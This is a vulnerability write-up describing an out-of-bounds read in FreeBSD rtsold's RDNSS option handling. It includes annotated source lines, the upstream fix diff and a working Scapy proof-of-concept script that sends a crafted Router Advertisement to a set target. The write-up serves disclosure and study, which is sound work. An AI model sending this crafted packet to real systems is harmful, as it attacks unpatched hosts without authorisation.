## FreeBSD rtsold Out of Bounds Read Vulnerability

On January 28th, 2021, Quarkslab published a blog "[Bad Neighbor on FreeBSD: IPv6 Router Advertisement Vulnerabilities in rtsold (CVE-2020-25577)](https://blog.quarkslab.com/bad-neighbor-on-freebsd-ipv6-router-advertisement-vulnerabilities-in-rtsold-cve-2020-25577.html)", which detailed about 4 vulnerabilities found in the IPv6 stack of FreeBSD, more specifically in `rtsold(8)`, the router solicitation daemon. After reading it, I took a look at `rtsold` , and found another out-of-bounds read vulnerability.

### Description

The function `rtsol_input()` in `usr.sbin/rtsold/rtsol.c` loops through the options included in a `Router Advertisement` message. One of the supported option types is called `Recursive DNS Server`, or `RDNSS` for short. The `RDNSS` option is composed of 4 fixed fields (`Type`, `Length`, `Reserved` and `Lifetime`), followed by a variable number of IPv6 addresses of recursive DNS servers. In general, the `Length` field is an odd multiple of 8.

When dealing with a `RDNSS` option, the routine will go to line 364. At line 376, the `addr` pointer is set to point past the 4 fixed fields of the `RNDSS` option, that is, it points to the beginning of the variable number of IPv6 addresses included in the `RDNSS` option. Then, at line 377, it loops over the IPv6 addresses in the `RDNSS` option, reading a 16-byte IPv6 address from the option data at each iteration, as long as the `addr` pointer doesn't reach the end of the option, which is calculated by using the `RA_OPT_NEXT_HDR` macro.

However, if we craft a `ND_OPT_RDNSS` option with `Length=4` (even multiple of 8), when the routine go to line 378 again, it will read 16-byte address from the option data, but there is only 8-byte available. As a result, out-of-bounds read will occur.

```c
157	void
158	rtsol_input(int sock)
159	{
[...]
339	
340	#define RA_OPT_NEXT_HDR(x)      (struct nd_opt_hdr *)((char *)(x) + \
341	                                (((struct nd_opt_hdr *)(x))->nd_opt_len * 8))
342	        /* Process RA options. */
343	        warnmsg(LOG_DEBUG, __func__, "Processing RA");
344	        raoptp = (char *)icp + sizeof(struct nd_router_advert);
345	        while (raoptp < (char *)icp + msglen) {
346	                ndo = (struct nd_opt_hdr *)raoptp;
[...]
352	
353	                if (ndo->nd_opt_len == 0) {
354	                        warnmsg(LOG_INFO, __func__, "invalid option length 0.");
355	                        break;
356	                }
357	                if ((char *)RA_OPT_NEXT_HDR(raoptp) > (char *)icp + msglen) {
358	                        warnmsg(LOG_INFO, __func__, "option length overflow.");
359	                        break;
360	                }
361	
362	                switch (ndo->nd_opt_type) {
363	                case ND_OPT_RDNSS:
364	                        rdnss = (struct nd_opt_rdnss *)raoptp;
365	
366	                        /* Optlen sanity check (Section 5.3.1 in RFC 6106) */
367	                        if (rdnss->nd_opt_rdnss_len < 3) {
368	                                warnmsg(LOG_INFO, __func__,
369	                                        "too short RDNSS option"
370	                                        "in RA from %s was ignored.",
371	                                        inet_ntop(AF_INET6, &from.sin6_addr,
372	                                            ntopbuf, sizeof(ntopbuf)));
373	                                break;
374	                        }
375	
376	                        addr = (struct in6_addr *)(void *)(raoptp + sizeof(*rdnss));
377	                        while ((char *)addr < (char *)RA_OPT_NEXT_HDR(raoptp)) {
378	                                if (inet_ntop(AF_INET6, addr, ntopbuf,
379	                                        sizeof(ntopbuf)) == NULL) {
380	                                        warnmsg(LOG_INFO, __func__,
381	                                            "an invalid address in RDNSS option"
382	                                            " in RA from %s was ignored.",
383	                                            inet_ntop(AF_INET6, &from.sin6_addr,
384	                                                ntopbuf, sizeof(ntopbuf)));
385	                                        addr++;
386	                                        continue;
387	                                }
[...]
436	                                addr++;
437	                        }
```

### Proof of Concept

The following code, based on `Scapy`, provides a proof-of-concept for the bug described above. It was tested against `FreeBSD 12.2-RELEASE-p3`.

```python
import string
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptDNSSL, ByteField, ShortField, IntField, StrField
from scapy.all import send, Packet

class MyICMPv6NDOptRDNSS(Packet):
    name = "ICMPv6 Neighbor Discovery Option - Recursive DNS Server Option"
    fields_desc = [ByteField("type", 25),
                   ByteField("len", 4),
                   ShortField("res", None),
                   IntField("lifetime", 0xffffffff),
                   StrField("dns", "AAAAAAAAAAAAAAAABBBBBBBB")
    ]

def rdnss_oob_read(target_addr):
    def build_domain_name(name_len):
        CHUNKS = name_len // 0x3f
        subdomains = []
        for i in range(CHUNKS):
            subdomains.append(string.ascii_lowercase[i] * 0x3f)
        domain = '.'.join(subdomains)
        print('final len(domain) :{}'.format(len(domain)))
        return domain

    ip = IPv6(dst = target_addr, hlim = 255)
    ra = ICMPv6ND_RA()
    dnssl1 = ICMPv6NDOptDNSSL(lifetime=1, searchlist=[build_domain_name(1024)])
    dnssl2 = ICMPv6NDOptDNSSL(lifetime=1, searchlist=[build_domain_name(375)])
    dnssl3 = ICMPv6NDOptDNSSL(lifetime=1, searchlist=['1'*22])

    rdnss = MyICMPv6NDOptRDNSS(lifetime=1)

    pkt = ip/ra/dnssl1/dnssl2/dnssl3/rdnss

    print("total pakcet len: %d" % (len(pkt)))
    print("total ipv6 len: %d" % (len(ra/dnssl1/dnssl2/dnssl3/rdnss)))
    send(pkt)

def main():
    target_addr = "fe80::20c:29ff:fed1:1999"
    rdnss_oob_read(target_addr)

if __name__ == '__main__':
    main()
```

### Patch

It has been fixed in this [commit](https://cgit.freebsd.org/src/commit/?id=1af332a7d8f86b6fcc1f0f575fe5b06021b54f4c) as follows.

```diff
diff --git a/usr.sbin/rtsold/rtsol.c b/usr.sbin/rtsold/rtsol.c
index 30027fc65ac9..76756bfd8393 100644
--- a/usr.sbin/rtsold/rtsol.c
+++ b/usr.sbin/rtsold/rtsol.c
@@ -363,13 +363,19 @@ rtsol_input(int sock)
 		case ND_OPT_RDNSS:
 			rdnss = (struct nd_opt_rdnss *)raoptp;
 
-			/* Optlen sanity check (Section 5.3.1 in RFC 6106) */
-			if (rdnss->nd_opt_rdnss_len < 3) {
+			/*
+			 * The option header is 8 bytes long and each address
+			 * occupies 16 bytes, so the option length must be
+			 * greater than or equal to 24 bytes and an odd multiple
+			 * of 8 bytes.  See section 5.1 in RFC 6106.
+			 */
+			if (rdnss->nd_opt_rdnss_len < 3 ||
+			    rdnss->nd_opt_rdnss_len % 2 == 0) {
 				warnmsg(LOG_INFO, __func__,
-		    			"too short RDNSS option"
-					"in RA from %s was ignored.",
-					inet_ntop(AF_INET6, &from.sin6_addr,
-					    ntopbuf, sizeof(ntopbuf)));
+				    "too short RDNSS option in RA from %s "
+				    "was ignored.",
+				inet_ntop(AF_INET6, &from.sin6_addr, ntopbuf,
+				    sizeof(ntopbuf)));
 				break;
 			}
```

### Reference

+ [Bad Neighbor on FreeBSD: IPv6 Router Advertisement Vulnerabilities in rtsold (CVE-2020-25577)](https://blog.quarkslab.com/bad-neighbor-on-freebsd-ipv6-router-advertisement-vulnerabilities-in-rtsold-cve-2020-25577.html)
+ [Multiple vulnerabilities in rtsold](https://www.freebsd.org/security/advisories/FreeBSD-SA-20:32.rtsold.asc)
+ [Neighbor Discovery Protocol](https://en.wikipedia.org/wiki/Neighbor_Discovery_Protocol)
+ [rtsold: Fix validation of RDNSS options](https://cgit.freebsd.org/src/commit/?id=1af332a7d8f86b6fcc1f0f575fe5b06021b54f4c)